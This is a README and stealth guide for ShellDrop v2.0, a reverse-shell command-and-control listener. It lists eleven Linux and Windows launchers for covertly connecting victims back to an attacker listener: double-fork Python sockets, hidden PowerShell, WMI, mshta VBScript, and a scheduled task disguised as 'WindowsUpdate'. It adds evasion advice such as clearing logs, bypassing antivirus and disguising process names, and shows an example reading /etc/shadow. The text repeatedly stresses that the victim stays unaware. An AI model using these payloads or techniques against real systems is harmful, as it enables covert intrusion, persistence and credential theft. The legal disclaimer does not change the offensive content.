# 🎯 ShellDrop v2.0 - Secure Edition

<div align="center">

```
╔═══════════════════════════════════════════════════════════════╗
║                    ShellDrop V 2.0 - SECURE                   ║
║  Professional Authenticated Reverse Shell Framework           ║
║                                                               ║
║ Author: unknone hart / kishwor dulal                          ║
║ Purpose: Authorized Penetration Testing & Red Team Ops        ║
╚═══════════════════════════════════════════════════════════════╝
```

**A Professional Multi-Client Command & Control Framework with Authentication**

[![Python 3.x](https://img.shields.io/badge/python-3.x-blue.svg)](https://www.python.org/)
[![License](https://img.shields.io/badge/license-Educational-green.svg)]()
[![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20Windows-lightgrey.svg)]()
[![Version](https://img.shields.io/badge/version-2.0-orange.svg)]()

[Features](#-features) • [Installation](#-installation) • [Usage](#-usage) • [Payloads](#-payload-library) • [Examples](#-examples) • [Security](#-security-features) • [Legal](#%EF%B8%8F-legal-disclaimer)

</div>

---

## 🆕 What's New in v2.0

### 🔐 **CRITICAL SECURITY UPGRADE**
- ✅ **HMAC Authentication** - Prevents unauthorized connections & C2 hijacking
- ✅ **Stealthy Backgrounding** - 11 payload variants that return terminal instantly
- ✅ **Session Logging** - Complete audit trail of all commands and output
- ✅ **OS Detection** - Automatically identifies Linux/Windows clients
- ✅ **Optional TLS Encryption** - Secure communications (v2.0 Secure)
- ✅ **Better Stability** - Improved error handling and recovery

### 🎯 **Why Upgrade?**

**v1.0 Problems:**
- ❌ No authentication → Anyone can connect and hijack your C2
- ❌ Payloads hang terminal → Victim notices immediately
- ❌ No logging → No audit trail for engagements
- ❌ Only 2 payload options → Limited flexibility

**v2.0 Solutions:**
- ✅ Token-based auth → Only authorized clients connect
- ✅ 11 stealthy payloads → Terminal returns instantly, victim sees nothing
- ✅ Full session logging → Complete audit trail with timestamps
- ✅ 11 payload variants → From simple to highly obfuscated

---

## 📋 Overview

**ShellDrop v2.0** is a robust, feature-rich reverse shell listener designed for authorized penetration testing and red team operations. It provides a professional command and control interface with **authenticated** multi-client support, advanced payload generation, and real-time session management.

### 🎯 Key Highlights

- 🔐 **HMAC Authentication** - Cryptographic authentication prevents C2 hijacking
- 🔄 **Multi-Client Support** - Manage multiple simultaneous reverse shell connections
- 👻 **Stealthy Backgrounding** - Payloads that return terminal instantly (victim sees nothing)
- 📝 **Session Logging** - Full audit trail with timestamps for compliance
- 🎨 **Interactive UI** - Colorized terminal output with intuitive command interface
- 🚀 **Real-Time Switching** - Seamlessly switch between active sessions
- 🧵 **Thread-Safe** - Robust concurrent connection handling
- 🎭 **Advanced Payloads** - 11+ stealthy authenticated shells for Linux & Windows

---

## ✨ Features

### 🔒 Security Features (NEW in v2.0)

| Feature | Description |
|---------|-------------|
| **HMAC Authentication** | Cryptographic token-based authentication prevents unauthorized connections |
| **Session Logging** | Every command and output logged with timestamps to disk |
| **Optional TLS** | SSL/TLS encryption for secure communications (Secure edition) |
| **OS Detection** | Automatically detects client operating system |
| **Token Generation** | Auto-generates secure random tokens or use custom tokens |

### 👻 Stealth Features (NEW in v2.0)

| Feature | Description |
|---------|-------------|
| **Daemon Mode** | True daemon with double-fork, detaches completely |
| **Background & Exit** | Returns terminal instantly, closes shell cleanly |
| **Nohup Persistence** | Survives terminal closure and SSH disconnects |
| **Screen Detached** | Runs invisibly in detached screen session |
| **WMI Creation** | Windows processes created via WMI (looks like system process) |
| **Hidden Jobs** | PowerShell background jobs with no visible window |

### 🖥️ Core Capabilities

| Feature | Description |
|---------|-------------|
| **Multi-Session Management** | Handle unlimited concurrent authenticated reverse shells |
| **Session Backgrounding** | Background sessions and return to main menu anytime |
| **Auto IP Detection** | Automatically detects your local IP address |
| **Payload Generator** | Generates 11+ stealthy authenticated payloads |
| **Thread-Safe I/O** | Clean output handling without race conditions |
| **Prompt Detection** | Automatically detects and displays remote shell prompts |
| **Kill Command** | Terminate specific sessions remotely |

### 🎨 User Interface

- **Colorized Output** - Easy-to-read color-coded messages
- **Session Tracking** - View all active sessions with IP addresses and OS type
- **Interactive Prompts** - Context-aware command prompts showing user@host
- **Background Operations** - Run commands while viewing output from all sessions
- **Real-time Logging** - All activity logged to `./shelldrop_logs/`

---

## 🚀 Installation

### Prerequisites

```bash
# Python 3.x required (3.7+ recommended)
python3 --version

# For TLS support (optional):
pip install pyOpenSSL
```

### Quick Install

```bash
# Clone the repository
git clone https://github.com/kishwordulal1234/ShellDrop.git

# Navigate to directory
cd ShellDrop

# Make executable (Linux/Mac)
chmod +x shelldrop_simple_auth.py

# Run the tool
python3 shelldrop_simple_auth.py -p 4444
```

### Dependencies

**Simple Auth Version (RECOMMENDED):**
- ✅ No external dependencies - uses only Python standard library
- ✅ `socket`, `threading`, `base64`, `hmac`, `hashlib`

**Secure Version (with TLS):**
- Requires: `pip install pyOpenSSL`
- Provides TLS encryption for secure communications

---

## 📖 Usage

### Basic Command (v2.0)

```bash
# Simple authenticated version (recommended)
python3 shelldrop_simple_auth.py -p <PORT> --token "YourSecretToken"

# Secure version with TLS
python3 shelldrop_secure.py -p <PORT> --tls --token "YourSecretToken"
```

### Command Line Options

```bash
usage: shelldrop_simple_auth.py [-h] [-l LISTEN_IP] -p PORT [--token TOKEN] [--log-dir LOG_DIR]

options:
  -h, --help            Show this help message and exit
  -l, --listen-ip       IP address to bind (auto-detected if not provided)
  -p, --port PORT       Port to listen on (required)
  --token TOKEN         Authentication token (auto-generated if not provided)
  --log-dir LOG_DIR     Directory for session logs (default: ./shelldrop_logs)
```

### Examples

```bash
# Auto-generate authentication token
python3 shelldrop_simple_auth.py -p 4444

# Use custom authentication token
python3 shelldrop_simple_auth.py -p 4444 --token "MySecretToken123"

# Specify listening IP and custom log directory
python3 shelldrop_simple_auth.py -l 192.168.1.100 -p 4444 --log-dir /var/log/shells

# Enable TLS encryption (Secure version)
python3 shelldrop_secure.py -p 4444 --tls --token "SecureToken"
```

---

## 🎮 Interactive Commands

### Main Menu Commands

| Command | Description |
|---------|-------------|
| `list` | Display all active sessions with IDs, IP addresses, and OS type |
| `use <id>` | Interact with a specific session by ID |
| `kill <id>` | Terminate a specific session |
| `help` | Show available commands |
| `exit` / `quit` | Shutdown the listener and close all connections |

### Session Commands

| Command | Description |
|---------|-------------|
| `<command>` | Execute any command on the remote system |
| `background` | Background the current session and return to main menu |

### Example Workflow

```bash
# Start listener
$ python3 shelldrop_simple_auth.py -p 4444 --token "grumpymonk19"

[*] Authentication Token: grumpymonk19
[!] Keep this token secure - required for all connections

[✓] Listener active on 192.168.1.100:4444
[✓] Logs: ./shelldrop_logs

# Victim executes payload (from displayed options)
# Connection authenticates automatically

shelldrop> [+] Authenticated: 192.168.1.105:52678 → ID: 1

shelldrop> list
╔═══ SESSIONS ═══════════════════════════════════════════╗
║ 01 │ 192.168.1.105  :52678 [linux]
╚════════════════════════════════════════════════════════╝

shelldrop> use 1
[*] Session 1 active | 'background' to detach

shelldrop>@user@target:~$> whoami
user

shelldrop>@user@target:~$> id
uid=1000(user) gid=1000(user) groups=1000(user),27(sudo)

shelldrop>@user@target:~$> background
[*] Session 1 backgrounded

shelldrop> exit
[*] Shutting down...
```

---

## 🎯 Payload Library

ShellDrop v2.0 generates **11 stealthy authenticated payloads** that properly background and return the terminal instantly.

### 🐧 Linux Payloads (5 Methods)

#### 1. **Daemon (Double Fork) - MOST STEALTHY** ⭐⭐⭐⭐⭐
**Use Case:** Maximum stealth, complete process detachment
```bash
python3 -c 'import os,sys,socket,subprocess,base64,hmac,hashlib;os.fork() and sys.exit();os.setsid();os.fork() and sys.exit();s=socket.socket();s.connect(("192.168.1.100",4444));...' &
```

**What happens:**
- ✅ Terminal returns **INSTANTLY**
- ✅ Process becomes true daemon (no parent)
- ✅ Survives terminal closure
- ✅ Invisible to casual observation
- ✅ Victim sees nothing suspicious

**Victim sees:**
```bash
$ python3 -c '...' &
$  ← Returns immediately, looks normal
```

---

#### 2. **Background & Exit - INSTANT RETURN** ⭐⭐⭐⭐
**Use Case:** Clean shell exit, looks like normal logout
```bash
(python3 -c 'AUTH_PAYLOAD' &) && exit
```

**What happens:**
- ✅ Payload runs in subshell background
- ✅ Shell exits immediately  
- ✅ Victim thinks they just logged out
- ✅ Connection stays active

**Victim sees:**
```bash
$ (python3 -c '...' &) && exit
logout
← Session closes cleanly
```

---

#### 3. **Nohup Persistent** ⭐⭐⭐⭐
**Use Case:** Survives SSH disconnects and terminal closure
```bash
nohup python3 -c 'AUTH_PAYLOAD' >/dev/null 2>&1 &
```

**Features:**
- ✅ Ignores hangup signals (SIGHUP)
- ✅ All output redirected to /dev/null
- ✅ Survives network interruptions
- ✅ Perfect for unstable connections

---

#### 4. **Screen Detached - INVISIBLE** ⭐⭐⭐⭐⭐
**Use Case:** Completely invisible execution
```bash
screen -dmS sys python3 -c 'AUTH_PAYLOAD'
```

**Features:**
- ✅ Runs in detached screen session
- ✅ Named "sys" (looks like system process)
- ✅ Can reattach later: `screen -r sys`
- ✅ Zero visible indication
- ✅ Very hard to detect

---

#### 5. **Encoded & Background** ⭐⭐⭐⭐
**Use Case:** Obfuscated payload, hidden from ps/grep
```bash
(python3 -c "import base64;exec(base64.b64decode('BASE64_PAYLOAD'))" &) && exit
```

**Features:**
- ✅ Payload is base64 encoded
- ✅ Not visible in command line
- ✅ `ps aux | grep socket` won't find it
- ✅ Returns terminal instantly

---

### 🪟 Windows Payloads (6 Methods)

#### 6. **Hidden Background Job** ⭐⭐⭐⭐
**Use Case:** PowerShell background job, no visible window
```powershell
powershell -nop -w hidden -c "Start-Job -ScriptBlock {AUTH_PAYLOAD}"
```

**Features:**
- ✅ Completely hidden window
- ✅ Background job execution
- ✅ Returns immediately
- ✅ No visible process

---

#### 7. **Start-Process Hidden** ⭐⭐⭐⭐⭐
**Use Case:** Most reliable Windows method
```powershell
powershell -c "Start-Process -NoNewWindow -FilePath powershell -ArgumentList '-nop','-w','hidden','-c','AUTH_PAYLOAD'"
```

**Features:**
- ✅ Spawns separate hidden process
- ✅ No window flashing
- ✅ Original PowerShell exits cleanly
- ✅ Very stealthy

---

#### 8. **WMI Process Creation** ⭐⭐⭐⭐⭐
**Use Case:** Maximum Windows stealth
```powershell
powershell -c "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'powershell -nop -w hidden -c AUTH_PAYLOAD'"
```

**Features:**
- ✅ Uses Windows Management Instrumentation
- ✅ Process looks like system service
- ✅ No parent-child relationship
- ✅ Hard to trace origin
- ✅ Very stealthy

---

#### 9. **Base64 Encoded** ⭐⭐⭐
**Use Case:** Obfuscated PowerShell execution
```powershell
powershell -nop -w hidden -enc <BASE64_UTF16LE_PAYLOAD>
```

**Features:**
- ✅ Entire payload base64 encoded
- ✅ UTF-16LE encoding (PowerShell native)
- ✅ Not visible in command history
- ✅ Bypasses some AV signatures

---

#### 10. **VBScript Launcher** ⭐⭐⭐⭐⭐
**Use Case:** Extremely stealthy Windows execution
```cmd
mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell -nop -w hidden -c AUTH_PAYLOAD"",0,False:close")
```

**Features:**
- ✅ MSHTA executes VBScript
- ✅ VBScript launches PowerShell hidden
- ✅ Instant return (doesn't wait)
- ✅ Very hard to detect
- ✅ No PowerShell visible initially

---

#### 11. **Scheduled Task** ⭐⭐⭐⭐
**Use Case:** Persistent Windows access
```powershell
powershell -c "schtasks /create /tn WindowsUpdate /tr 'powershell -nop -w hidden -c AUTH_PAYLOAD' /sc once /st 00:00 /f; schtasks /run /tn WindowsUpdate"
```

**Features:**
- ✅ Creates scheduled task
- ✅ Executes immediately
- ✅ Can be made persistent
- ✅ Looks like Windows Update task

---

## 🔐 Authentication Flow

### How Authentication Works

```
1. Client connects to listener
   ↓
2. Server sends challenge: AUTH:<base64_random_bytes>
   ↓
3. Client computes: HMAC-SHA256(token, challenge)
   ↓
4. Client sends: <base64_hmac>
   ↓
5. Server verifies HMAC
   ↓
6. If valid → AUTH:OK → Shell established
   If invalid → AUTH:FAIL → Connection closed
```

### Security Benefits

- ✅ **Prevents C2 Hijacking** - Attacker can't connect without token
- ✅ **Replay Protection** - Challenge-response prevents replay attacks
- ✅ **No Token Transmission** - Token never sent over network
- ✅ **Cryptographic Security** - HMAC-SHA256 authentication

### Example Authentication

```bash
# Server generates token
Token: grumpymonk19

# Payload includes token
python3 -c 'hmac.new(b"grumpymonk19", challenge, hashlib.sha256)...'

# Only clients with correct token can connect
```

---

## 💡 Examples

### Example 1: Basic Authenticated Access

**Scenario:** Secure shell on Linux target

```bash
# 1. Start ShellDrop with custom token
$ python3 shelldrop_simple_auth.py -p 4444 --token "SecureToken123"

[*] Authentication Token: SecureToken123
[✓] Listener active on 192.168.1.100:4444

# 2. On target, use "Background & Exit" payload:
victim@target:~$ (python3 -c 'AUTH_PAYLOAD' &) && exit
logout

# 3. Target shell exits, but connection established!
[+] Authenticated: 192.168.1.105:52678 → ID: 1

shelldrop> use 1
shelldrop>@victim@target:~$> whoami
victim
```

**Victim experience:**
- Terminal returns immediately
- Looks like normal logout
- No hanging process
- **Completely unaware!**

---

### Example 2: Multi-Client Authenticated Management

**Scenario:** Multiple compromised systems with authentication

```bash
shelldrop> list
╔═══ SESSIONS ═══════════════════════════════════════════╗
║ 01 │ 192.168.1.105  :49234 [linux]
║ 02 │ 192.168.1.106  :52891 [windows]
║ 03 │ 10.0.0.50      :41023 [linux]
╚════════════════════════════════════════════════════════╝

# All sessions authenticated with same token
# Attacker without token cannot connect

shelldrop> use 2
shelldrop>PS C:\Users\User> Get-ComputerInfo | Select-Object OsName
OsName: Microsoft Windows 10 Pro

shelldrop> background
shelldrop> use 1
shelldrop>@admin@server:~$> cat /etc/shadow | grep root
```

---

### Example 3: Stealthy Windows Access

**Scenario:** Bypass detection on Windows 10/11

```bash
# 1. Start listener
$ python3 shelldrop_simple_auth.py -p 443 --token "SecureKey"

# 2. On Windows target, use WMI payload:
PS> powershell -c "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'powershell -nop -w hidden -c AUTH_PAYLOAD'"

# Process created, returns immediately
# No visible window
# Looks like system service

[+] Authenticated: 192.168.1.200:50123 → ID: 1

shelldrop> use 1
shelldrop>PS C:\> Get-Process | Where-Object {$_.Name -like "*powershell*"}

# Your shell runs invisibly
```

---

### Example 4: Session Logging for Compliance

**Scenario:** Penetration test requiring audit trail

```bash
# Start with custom log directory
$ python3 shelldrop_simple_auth.py -p 4444 --log-dir /var/log/pentest --token "PentestToken"

[✓] Logs: /var/log/pentest

# All commands and output logged:
$ cat /var/log/pentest/session_1_20260214_143022_192.168.1.105.log

======================================================================
ShellDrop Session - ID: 1
Client: 192.168.1.105:52678
Time: 2026-02-14 14:30:22
======================================================================

[2026-02-14 14:30:22] [AUTH] SUCCESS
[2026-02-14 14:30:22] [INFO] OS: Linux
[2026-02-14 14:30:35] [CMD] whoami
[2026-02-14 14:30:35] [OUTPUT] user
[2026-02-14 14:30:42] [CMD] id
[2026-02-14 14:30:42] [OUTPUT] uid=1000(user) gid=1000(user)...
```

---

## 🏗️ Architecture

```
┌──────────────────────────────────────────────────────────────┐
│                   ShellDrop v2.0 Server                      │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  ┌────────────┐    ┌──────────────┐    ┌──────────────┐   │
│  │ Main Loop  │───▶│ Input Queue  │───▶│ Session Logs │   │
│  └────────────┘    └──────────────┘    └──────────────┘   │
│         │                                                   │
│         ▼                                                   │
│  ┌────────────────────────────┐                            │
│  │ Connection Acceptor Thread │                            │
│  └────────────────────────────┘                            │
│         │                                                   │
│         ▼                                                   │
│  ┌──────────────────────────────────────┐                 │
│  │    HMAC Authentication Check         │                 │
│  │  Challenge → Verify → Accept/Reject  │                 │
│  └──────────────────────────────────────┘                 │
│         │ (Authenticated Only)                             │
│         ▼                                                   │
│  ┌──────────────────────────────────────────┐             │
│  │ Client Objects (Thread + Logger/Client)  │             │
│  ├──────────────────────────────────────────┤             │
│  │  Client 1   │  Client 2   │  Client 3   │             │
│  │  [linux]    │  [windows]  │  [linux]    │             │
│  │  Thread     │  Thread     │  Thread     │             │
│  │  Logger     │  Logger     │  Logger     │             │
│  └──────────────────────────────────────────┘             │
│         │             │             │                       │
│         ▼             ▼             ▼                       │
│  ┌──────────────────────────────────────────┐             │
│  │     Output Queues (Per Client)           │             │
│  └──────────────────────────────────────────┘             │
│                                                             │
└──────────────────────────────────────────────────────────────┘
                          │
                          ▼
              ┌──────────────────────┐
              │  Remote Targets      │
              ├──────────────────────┤
              │ 🐧 Linux (Auth)      │
              │ 🪟 Windows (Auth)    │
              └──────────────────────┘
```

### Key Components

1. **Authentication Layer** - HMAC challenge-response before shell access
2. **Session Logger** - Records all activity per session to disk
3. **OS Detection** - Identifies client OS automatically
4. **Thread-Safe Queues** - One output queue per client
5. **Global Locks** - `clients_lock` and `print_lock` for concurrency

---

## 🛡️ Security Analysis

### ✅ What ShellDrop v2.0 Protects Against

| Threat | v1.0 | v2.0 | How v2.0 Prevents It |
|--------|------|------|----------------------|
| **C2 Hijacking** | ❌ Vulnerable | ✅ Protected | HMAC authentication - attacker needs token |
| **Replay Attacks** | ❌ N/A | ✅ Protected | Challenge-response - each auth unique |
| **Terminal Detection** | ❌ Obvious | ✅ Stealthy | Backgrounding - terminal returns instantly |
| **Process Detection** | ⚠️ Visible | ✅ Hidden | Daemon/WMI - looks like system process |
| **Command Logging** | ❌ None | ✅ Complete | Session logs - full audit trail |
| **Unauthorized Access** | ❌ Anyone | ✅ Token Only | Cryptographic verification required |

### ⚠️ What You Still Need to Protect

| Risk | Mitigation |
|------|------------|
| **Network Detection** | Use VPN/tunneling, common ports (443), encrypt with TLS |
| **EDR/AV Detection** | Obfuscate payloads, use legitimate binaries, in-memory execution |
| **Log Analysis** | Clear logs, use legitimate-looking process names |
| **Netflow Analysis** | Irregular beaconing, blend traffic patterns |

---

## 🔧 Troubleshooting

### Issue: Authentication Failure

```bash
[-] Auth failed: 192.168.1.105:52678
```

**Causes:**
- Wrong token in payload
- Network interference corrupting challenge
- Timing issues

**Solutions:**
```bash
# Verify token matches
--token "grumpymonk19"  # Server
b'grumpymonk19'         # Payload

# Check for special characters
# Avoid spaces, quotes in tokens
```

---

### Issue: "Address already in use"

```bash
OSError: [Errno 98] Address already in use
```

**Solution:**
```bash
# Find process using port
sudo lsof -i :4444
sudo netstat -tlnp | grep 4444

# Kill it
sudo kill -9 <PID>

# Or use different port
python3 shelldrop_simple_auth.py -p 4445
```

---

### Issue: Session Logs Not Created

**Check:**
```bash
# Verify log directory permissions
ls -ld ./shelldrop_logs
drwxr-xr-x  # Should be writable

# Create manually if needed
mkdir -p ./shelldrop_logs
chmod 755 ./shelldrop_logs

# Specify custom directory
python3 shelldrop_simple_auth.py -p 4444 --log-dir /tmp/logs
```

---

### Issue: Payload Returns to Terminal but No Connection

**Possible Causes:**
1. Firewall blocking outbound connection
2. Wrong IP/port in payload
3. Authentication token mismatch

**Debug Steps:**
```bash
# Test direct connection
nc -zv <LISTENER_IP> <PORT>

# Check firewall
sudo ufw status                    # Linux
Get-NetFirewallRule               # Windows

# Verify listener is running
sudo netstat -tlnp | grep <PORT>

# Check token in both server and payload
```

---

## 🎓 Best Practices

### For Penetration Testers

1. ✅ **Always get written authorization** before testing
2. ✅ **Use unique tokens per engagement** - Don't reuse tokens
3. ✅ **Save session logs** - Required for compliance and reporting
4. ✅ **Use common ports** - 80, 443, 53, 8080 (less suspicious)
5. ✅ **Clean up after testing** - Close sessions properly, delete payloads
6. ✅ **Test in isolated environment first** - Verify payloads work

### For Red Team Operations

1. ✅ **Layer your obfuscation** - Use encoded + backgrounded payloads
2. ✅ **Vary your payloads** - Don't use same payload twice
3. ✅ **Monitor for detection** - Watch for alerts/blocks
4. ✅ **Use port forwarding** - Hide actual C2 server IP
5. ✅ **Rotate tokens** - Change tokens periodically
6. ✅ **Implement persistence carefully** - Use scheduled tasks/cron
7. ✅ **Blend traffic** - Irregular timing, HTTPS wrapping

### Token Security

```bash
# Generate strong tokens
python3 -c "import base64,os; print(base64.b64encode(os.urandom(32)).decode())"

# Store securely
export SHELLDROP_TOKEN="YourSecretToken"
python3 shelldrop_simple_auth.py -p 4444 --token "$SHELLDROP_TOKEN"

# Never hardcode in scripts
# Use environment variables or secure files
```

---

## 📊 Comparison Matrix

| Feature | ShellDrop v1.0 | ShellDrop v2.0 | Metasploit | Netcat | Empire |
|---------|----------------|----------------|------------|--------|---------|
| Authentication | ❌ | ✅ | ✅ | ❌ | ✅ |
| Session Logging | ❌ | ✅ | ✅ | ❌ | ✅ |
| Stealthy Payloads | ⚠️ | ✅ | ✅ | ❌ | ✅ |
| Multi-Client | ✅ | ✅ | ✅ | ❌ | ✅ |
| No Dependencies | ✅ | ✅ | ❌ | ✅ | ❌ |
| Lightweight | ✅ | ✅ | ❌ | ✅ | ❌ |
| Background Return | ❌ | ✅ | ✅ | ❌ | ✅ |
| OS Detection | ❌ | ✅ | ✅ | ❌ | ✅ |
| Learning Curve | 🟢 Easy | 🟢 Easy | 🟡 Medium | 🟢 Easy | 🔴 Hard |

---

## 🗺️ Roadmap

### Version 2.1 (In Progress)
- [x] HMAC authentication
- [x] Session logging
- [x] Stealthy backgrounding
- [x] OS detection
- [ ] File upload/download
- [ ] Command history per session
- [ ] Encrypted communications (TLS) - Available in Secure edition

### Version 2.2 (Planned)
- [ ] Tab completion
- [ ] Multiple authentication tokens
- [ ] Session reconnection support
- [ ] Plugin system
- [ ] Web-based UI

### Version 3.0 (Future)
- [ ] Full TLS/SSL by default
- [ ] Database backend
- [ ] RESTful API
- [ ] Port forwarding
- [ ] Screenshot capture
- [ ] Keylogging module

---

## 🤝 Contributing

Contributions welcome! Please test thoroughly and follow security best practices.

### How to Contribute

1. Fork the repository
2. Create feature branch: `git checkout -b feature/awesome`
3. Commit changes: `git commit -m 'Add awesome feature'`
4. Push to branch: `git push origin feature/awesome`
5. Open Pull Request

### Priority Areas

- 🔒 Additional evasion techniques
- 📝 Improved logging capabilities
- 🌐 Cross-platform compatibility
- 🎨 UI/UX improvements
- 📚 Documentation enhancements

---

## 📜 Changelog

### v2.0 (Current - February 2026)
- ✨ **MAJOR UPDATE: Authentication system**
- ✨ HMAC-SHA256 challenge-response authentication
- ✨ Session logging with full audit trail
- ✨ 11 stealthy backgrounding payload variants
- ✨ OS detection (Linux/Windows)
- ✨ `kill <id>` command for session termination
- ✨ Improved stability and error handling
- ✨ Optional TLS encryption (Secure edition)
- 🐛 Fixed Windows payload issues
- 🐛 Fixed payload backgrounding problems
- 🐛 Improved prompt detection

### v1.0 Beta (Initial Release)
- ✅ Multi-client support
- ✅ 13+ payload templates
- ✅ Linux & Windows support
- ✅ AMSI bypass
- ✅ Interactive interface

---

## ⚠️ Legal Disclaimer

```
╔═══════════════════════════════════════════════════════════════╗
║                      IMPORTANT LEGAL NOTICE                    ║
╚═══════════════════════════════════════════════════════════════╝

This tool is designed for EDUCATIONAL PURPOSES and AUTHORIZED 
PENETRATION TESTING ONLY.

❌ UNAUTHORIZED USE IS STRICTLY PROHIBITED AND ILLEGAL

By using this tool, you agree to:

1. ✅ Only use on systems you own or have WRITTEN PERMISSION to test
2. ✅ Comply with all applicable local, state, and federal laws
3. ✅ Take full responsibility for your actions
4. ✅ Not use for malicious purposes
5. ✅ Maintain confidentiality of tokens and logs

The author(s) assume NO LIABILITY for misuse or damage caused by 
this tool. Unauthorized access to computer systems is a federal 
crime in most countries.

⚖️  Relevant Laws (USA):
   - Computer Fraud and Abuse Act (CFAA) - 18 U.S.C. § 1030
   - Electronic Communications Privacy Act (ECPA)
   - State-specific hacking laws

🌍 International: Similar laws exist worldwide

PROFESSIONAL USE ONLY. BE ETHICAL. BE LEGAL. GET AUTHORIZATION.
```

---

## 📞 Support & Contact

### 📧 Author
**unknone hart / kishwor dulal**

### 🐛 Report Issues
Found a bug? Open an issue with:
- Python version
- Operating system
- Error message
- Steps to reproduce
- ShellDrop version (v1.0 or v2.0)

### 💬 Community
- **GitHub Issues** - Bug reports
- **GitHub Discussions** - Questions and ideas
- **Pull Requests** - Contributions
- **Star the repo** - Show support! ⭐

---

## 📚 Additional Resources

### Documentation
- [Backgrounding Guide](BACKGROUNDING_GUIDE.md) - Detailed stealth techniques
- [Security Analysis](shelldrop_analysis.md) - Complete security assessment
- [Authentication Flow](docs/authentication.md) - How auth works

### Learning Resources
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [Penetration Testing Execution Standard](http://www.pentest-standard.org/)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)

### Related Tools
- [Metasploit Framework](https://www.metasploit.com/)
- [PowerShell Empire](https://github.com/BC-SECURITY/Empire)
- [Covenant C2](https://github.com/cobbr/Covenant)
- [Sliver](https://github.com/BishopFox/sliver)

---

## 📄 License

**Educational Use License**

```
Copyright (c) 2024-2026 unknone hart / kishwor dulal

Permission is granted to use this software for educational and 
authorized security testing purposes only.

THIS SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND.
```

---

## 🌟 Acknowledgments

Special thanks to:
- The Python Software Foundation
- The penetration testing community
- All contributors and security researchers
- Beta testers who identified critical issues

---

## 🔖 Quick Reference Card

```
╔═══════════════════════════════════════════════════════════╗
║            ShellDrop v2.0 Quick Reference                  ║
╠═══════════════════════════════════════════════════════════╣
║ START LISTENER                                            ║
║ python3 shelldrop_simple_auth.py -p 4444 --token "TOKEN"  ║
║                                                           ║
║ COMMANDS                                                  ║
║ list                  - Show active sessions              ║
║ use <id>              - Interact with session             ║
║ kill <id>             - Terminate session                 ║
║ background            - Background current session        ║
║ exit                  - Quit ShellDrop                    ║
║                                                           ║
║ BEST PAYLOADS (v2.0)                                      ║
║ 🐧 Linux:   Background & Exit (instant return)           ║
║ 🐧 Linux:   Daemon (most stealthy)                       ║
║ 🪟 Windows: WMI Create (looks like system process)       ║
║ 🪟 Windows: Start-Process (reliable & hidden)            ║
║                                                           ║
║ SECURITY FEATURES                                         ║
║ ✅ HMAC Authentication (prevents hijacking)              ║
║ ✅ Session Logging (audit trail)                         ║
║ ✅ Stealthy Payloads (11 variants)                       ║
║ ✅ OS Detection (auto-identifies targets)                ║
╚═══════════════════════════════════════════════════════════╝
```

---

<div align="center">

### ⭐ If you find ShellDrop useful, please star the repository! ⭐

**Made with ❤️ for the Security Community**

**v2.0 - Now with Authentication, Logging, and Maximum Stealth**

[⬆ Back to Top](#-shelldrop-v20---secure-edition)

</div>

---

# ShellDrop Backgrounding & Stealth Guide

## 🎯 THE PROBLEM YOU IDENTIFIED

**Original payload behavior:**
```bash
$ python3 -c "import socket..." 
[HANGS - terminal frozen]
^C ^C ^C  ← Victim sees this and knows something is wrong!
```

**What the victim sees:**
- Terminal is stuck/frozen
- Can't type commands
- Suspicious process running in foreground
- Has to Ctrl+C to get control back

## ✅ THE SOLUTION: PROPER BACKGROUNDING

Now you have **11 different stealthy payload options** that properly background!

---

## 🐧 LINUX PAYLOADS (5 Methods)

### Method 1: **Daemon (Double Fork)** - MOST STEALTHY ⭐⭐⭐⭐⭐
```bash
python3 -c 'import os,sys...; os.fork() and sys.exit(); os.setsid(); os.fork() and sys.exit(); ...' &
```

**What happens:**
1. First `fork()` creates child process
2. Parent exits immediately → terminal returns instantly
3. `setsid()` creates new session (detaches from terminal)
4. Second `fork()` prevents process from ever getting a controlling terminal
5. Process runs as true daemon in background

**Victim sees:**
```bash
$ python3 -c '...' &
$  ← Terminal returns INSTANTLY, looks normal
```

**Pros:**
- Returns terminal immediately
- Process completely detached
- Can't be killed by closing terminal
- Survives logout (session leader)
- No visible process in foreground

---

### Method 2: **Background & Exit** - INSTANT RETURN ⭐⭐⭐⭐
```bash
(python3 -c '...' &) && exit
```

**What happens:**
1. `(...)` runs in subshell
2. `&` backgrounds it
3. `exit` immediately closes the current shell
4. Reverse shell keeps running in background

**Victim sees:**
```bash
$ (python3 -c '...' &) && exit
[Session closed or new prompt]  ← Shell exits, looks like they just logged out
```

**Pros:**
- Terminal exits completely
- Looks like normal logout
- Very clean

---

### Method 3: **Nohup** - PERSISTENT ⭐⭐⭐⭐
```bash
nohup python3 -c '...' >/dev/null 2>&1 &
```

**What happens:**
1. `nohup` ignores hangup signals
2. `>/dev/null 2>&1` hides all output
3. `&` backgrounds the process
4. Process survives terminal closure

**Victim sees:**
```bash
$ nohup python3 -c '...' >/dev/null 2>&1 &
[1] 12345
$  ← Terminal returns, shows background job ID
```

**Pros:**
- Survives SSH disconnect
- Survives terminal closure
- Very persistent

---

### Method 4: **Screen Detached** - INVISIBLE ⭐⭐⭐⭐⭐
```bash
screen -dmS sys python3 -c '...'
```

**What happens:**
1. `screen -dm` creates detached screen session
2. `-S sys` names it "sys" (looks legit)
3. Process runs inside screen
4. Terminal returns instantly

**Victim sees:**
```bash
$ screen -dmS sys python3 -c '...'
$  ← Returns immediately, zero indication
```

**Pros:**
- Completely invisible
- Can reattach later with `screen -r sys`
- Very hard to detect
- Looks like system process

---

### Method 5: **Base64 Encoded & Background** - OBFUSCATED ⭐⭐⭐⭐
```bash
(python3 -c "import base64;exec(base64.b64decode('...'))" &) && exit
```

**What happens:**
1. Payload is base64 encoded (hides from ps/grep)
2. Runs in background
3. Shell exits immediately

**Pros:**
- Payload not visible in command line
- Hard to detect with `ps aux | grep socket`
- Returns terminal instantly

---

## 🪟 WINDOWS PAYLOADS (6 Methods)

### Method 1: **Hidden Background Job** ⭐⭐⭐⭐
```powershell
powershell -nop -w hidden -c "Start-Job -ScriptBlock {...}"
```

**What happens:**
1. PowerShell starts with hidden window
2. `Start-Job` creates background job
3. PowerShell exits immediately
4. Job keeps running

**Victim sees:**
```
C:\> powershell -nop -w hidden -c "Start-Job..."
C:\>  ← Returns instantly
```

---

